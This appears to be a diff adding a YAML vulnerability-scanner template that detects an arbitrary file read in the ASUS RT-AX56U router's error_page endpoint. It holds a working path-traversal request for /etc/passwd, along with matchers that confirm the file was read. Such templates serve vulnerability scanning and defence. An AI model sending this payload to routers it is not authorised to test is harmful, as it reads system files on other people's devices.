@@ -1,0 +1,24 @@
+id: poc-yaml-asus-rt-ax56u-error-page-file-read
+
+info:
+  name: "ASUS RT-AX56U Router error_page 接口任意文件读取漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: asus-rt-ax56u
+  description: |
+    The ASUS RT-AX56U router is vulnerable to an arbitrary file read vulnerability via the error_page endpoint.
+
+http:
+  - method: GET
+    path:
+      - "/error_page.htm?current_lang=/////etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin/sh"
